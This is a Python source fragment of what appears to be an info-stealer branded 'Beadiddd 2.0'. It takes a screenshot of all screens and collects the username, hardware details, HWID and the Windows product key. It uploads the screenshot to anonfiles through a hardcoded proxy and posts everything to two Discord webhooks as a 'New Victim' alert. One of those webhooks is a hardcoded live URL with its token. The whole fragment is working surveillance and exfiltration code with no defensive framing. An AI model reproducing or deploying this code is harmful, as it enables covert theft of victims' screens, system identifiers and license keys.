class Screeny:

    def __init__(self):
        jtjirjihirthr = False
        self.Screen()
        self.Info()
        proxies = {
            'https': '38.170.97.205:8080'
        }
        file = requests.post('https://api.anonfiles.com/upload', proxies=proxies, files={'file':open("testy.jpg","rb")})
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
        if jtjirjihirthr:
            content = "@everyone New Hit"
        else:
            content = "New Hit"
        dual = r'https://discord.com/api/webhooks/1086774409051770910/C2ft6LFhqdTpsb51sISp2NMxOZCQwM7Mgq946cqN3v4uqbVWSHoawsEithGR4q1xc8kk'
        webhook1, webhook2 = DiscordWebhook.create_batch(urls=[wbh, dual], username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png",content=content)
        embed = DiscordEmbed(title=f"New Victim", description=f"New victim | Pc Info + Screenshot", color='4300d1')
        embed.set_author(name="author : Beadiddd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
        embed.set_timestamp()
        embed.set_image(url=r)
        embed.add_embed_field(name=f":desktop: Logged : ``{self.user}``", value=f"\n:fax: Machine : ``{self.machine}``\n:gear: System : ``{self.system}``\n:control_knobs: Processor : ``{self.processor}``\n\n\n:floppy_disk: **Virtual Memory**\n:battery: Total : ``{self.TotalM}``\n:alembic: Available : ``{self.availableM}``\n:low_battery: Used : ``{self.usedM}``\n:symbols: Pourcentage : ``{self.pourcentageM}``\n\n\n:id: HWID : ``{self.hwid}``\n:key: Windows Product Key : {self.windowspk}")
        webhook1.add_embed(embed)
        webhook2.add_embed(embed)
        webhook1.execute()
        webhook2.execute()
        os.remove("testy.jpg")
    
    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save("testy.jpg")
        s.close()
    
    def Size(self,b):
        for unit in ["", "K", "M", "G", "T", "P"]:
            if b < 1024:
                return f"{b:.2f}{unit}B"
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+"%"
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid')).replace(" ","").split("\\n")[1].split("\\r")[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(" ")
            self.windowspk = f"``{self.windowspk[0][3:]}``"
        except:
            self.windowspk = ":x:"
